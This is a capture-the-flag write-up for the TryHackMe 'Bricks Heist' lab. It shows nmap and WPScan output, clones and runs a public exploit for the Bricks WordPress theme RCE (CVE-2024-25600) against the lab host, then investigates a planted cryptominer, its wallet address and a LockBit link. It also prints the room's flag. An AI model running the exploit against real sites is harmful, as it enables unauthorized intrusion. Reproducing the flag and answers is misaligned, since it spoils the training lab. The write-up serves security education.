# TryHackMe TryHack3M: Bricks Heist Writeup

* ## Nmap scan

```
nmap -sCV 10.10.176.149
```

```java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 16:44 EDT
Nmap scan report for bricks.thm (10.10.176.149)
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:1e:83:d1:1a:3e:d8:c7:f7:10:49:5d:bd:ca:af:9c (RSA)
|   256 ee:56:ef:8f:63:75:47:b9:b9:a1:4e:06:8c:1d:4b:32 (ECDSA)
|_  256 f3:4c:cd:01:09:16:bb:69:6e:60:08:6b:a7:8f:37:03 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Brick by Brick
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 6.5
| tls-alpn: 
|   h2
|_  http/1.1
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.63 seconds

```

edit ``/etc/hosts``

```
sudo nano /etc/hosts
```

```url
10.10.176.149    bricks.thm
```

---

* ## Wp_scan

```
wpscan --url https://bricks.thm/ --disable-tls-checks
```

```ruby
[+] URL: https://bricks.thm/ [10.10.33.2]
[+] Started: Sun Jun 22 17:07:27 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:50 <=================================================================> (137 / 137) 100.00% Time: 00:00:50

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 22 17:08:23 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.448 KB
[+] Data Received: 110.502 KB
[+] Memory used: 269.355 MB
[+] Elapsed time: 00:00:56
```

![image](https://github.com/user-attachments/assets/ce0fda81-f492-4d95-b63b-488b663c7069)

[github](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

```
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT.git
```

* ##  CVE-2024-25600

```
python CVE-2024-25600.py -u https://bricks.thm
```

![image](https://github.com/user-attachments/assets/2664b383-888d-4c2a-a87d-8c2fcd9c77cd)

then 

![image](https://github.com/user-attachments/assets/00956e6e-e745-4a6a-bdb5-ea25ad4bce17)

```
THM{fl46_650c844110baced87e1606453b93f22a}
```

* ## What is the name of the suspicious process?

```
systemctl | grep running
```

```css
 proc-sys-fs-binfmt_misc.automount                loaded active     running   Arbitrary Executable File Formats File System Automount Point                
  acpid.path                                       loaded active     running   ACPI Events Check                                                            
  init.scope                                       loaded active     running   System and Service Manager                                                   
  session-c1.scope                                 loaded active     running   Session c1 of user lightdm                                                   
  accounts-daemon.service                          loaded active     running   Accounts Service                                                             
  acpid.service                                    loaded active     running   ACPI event daemon                                                            
  atd.service                                      loaded active     running   Deferred execution scheduler                                                 
  avahi-daemon.service                             loaded active     running   Avahi mDNS/DNS-SD Stack                                                      
  badr.service                                     loaded active     running   Badr Service                                                                 
  cron.service                                     loaded active     running   Regular background program processing daemon                                 
  cups-browsed.service                             loaded active     running   Make remote CUPS printers available locally                                  
  cups.service                                     loaded active     running   CUPS Scheduler                                                               
  dbus.service                                     loaded active     running   D-Bus System Message Bus                                                     
  getty@tty1.service                               loaded active     running   Getty on tty1                                                                
  httpd.service                                    loaded active     running   LSB: starts Apache Web Server                                                
  irqbalance.service                               loaded active     running   irqbalance daemon                                                            
  kerneloops.service                               loaded active     running   Tool to automatically collect and submit kernel crash signatures             
  lightdm.service                                  loaded active     running   Light Display Manager                                                        
  ModemManager.service                             loaded active     running   Modem Manager                                                                
  multipathd.service                               loaded active     running   Device-Mapper Multipath Device Controller                                    
  mysqld.service                                   loaded active     running   LSB: start and stop MySQL                                                    
  networkd-dispatcher.service                      loaded active     running   Dispatcher daemon for systemd-networkd                                       
  NetworkManager.service                           loaded active     running   Network Manager                                                              
  polkit.service                                   loaded active     running   Authorization Manager                                                        
  rsyslog.service                                  loaded active     running   System Logging Service                                                       
  rtkit-daemon.service                             loaded active     running   RealtimeKit Scheduling Policy Service                                        
  serial-getty@ttyS0.service                       loaded active     running   Serial Getty on ttyS0                                                        
  snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running   Service for snap application amazon-ssm-agent.amazon-ssm-agent               
  snapd.service                                    loaded active     running   Snap Daemon                                                                  
  ssh.service                                      loaded active     running   OpenBSD Secure Shell server                                                  
  switcheroo-control.service                       loaded active     running   Switcheroo Control Proxy service                                             
  systemd-journald.service                         loaded active     running   Journal Service                                                              
  systemd-logind.service                           loaded active     running   Login Service                                                                
  systemd-networkd.service                         loaded active     running   Network Service                                                              
  systemd-resolved.service                         loaded active     running   Network Name Resolution                                                      
  systemd-timesyncd.service                        loaded active     running   Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running   TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running   Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running   Unattended Upgrades Shutdown                                                 
  upower.service                                   loaded active     running   Daemon for power management                                                  
  user@1000.service                                loaded active     running   User Manager for UID 1000                                                    
  user@114.service                                 loaded active     running   User Manager for UID 114                                                     
  whoopsie.service                                 loaded active     running   crash report submission daemon                                               
  wpa_supplicant.service                           loaded active     running   WPA supplicant                                                               
  acpid.socket                                     loaded active     running   ACPID Listen Socket                                                          
  avahi-daemon.socket                              loaded active     running   Avahi mDNS/DNS-SD Stack Activation Socket                                    
  cups.socket                                      loaded active     running   CUPS Scheduler                                                               
  dbus.socket                                      loaded active     running   D-Bus System Message Bus Socket                                              
  multipathd.socket                                loaded active     running   multipathd control socket                                                    
  snapd.socket                                     loaded active     running   Socket activation for snappy daemon                                          
  syslog.socket                                    loaded active     running   Syslog Socket                                                                
  systemd-journald-audit.socket                    loaded active     running   Journal Audit Socket                                                         
  systemd-journald-dev-log.socket                  loaded active     running   Journal Socket (/dev/log)                                                    
  systemd-journald.socket                          loaded active     running   Journal Socket                                                               
  systemd-networkd.socket                          loaded active     running   Network Service Netlink Socket                                               
  systemd-udevd-control.socket                     loaded active     running   udev Control Socket                                                          
  systemd-udevd-kernel.socket                      loaded active     running   udev Kernel Socket                                                           

```

![image](https://github.com/user-attachments/assets/865fb2af-91ed-4a53-8afc-07ad9f32848c)

* ## What is the service name affiliated with the suspicious process?

![image](https://github.com/user-attachments/assets/d24279c5-2116-4305-b2d8-47762ea42c0f)

```css
ubuntu.service                                   loaded active     running   TRYHACK3M 
```

* ## What is the log file name of the miner instance?

```
ls /lib/NetworkManager
```

![image](https://github.com/user-attachments/assets/bb341c3a-c567-4031-b259-e8e452e488d9)

* ## What is the wallet address of the miner instance?

```
cat /lib/NetworkManager/inet.conf
```

![image](https://github.com/user-attachments/assets/e48f8f24-eff7-4ab0-92ab-9a7ac826a0fa)

```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

![image](https://github.com/user-attachments/assets/c637fac4-650e-4a42-bc44-06fc35764e46)

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

there is two this is true 

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

To check if they are valid I went to https://www.blockchain.com/explorer/

![image](https://github.com/user-attachments/assets/fc4eeee8-b434-4760-a9c0-47c0734211ce)

The first address was valid, confirming it as the answer.

* ## The wallet address used has been involved in transactions between wallets belonging to which threat group?

![image](https://github.com/user-attachments/assets/03626bf3-a413-4e70-86ca-d25501328a3f)

```
lockbit
```

![image](https://github.com/user-attachments/assets/6ccc2fc0-b8e2-4560-aa12-223cd77b9adc)

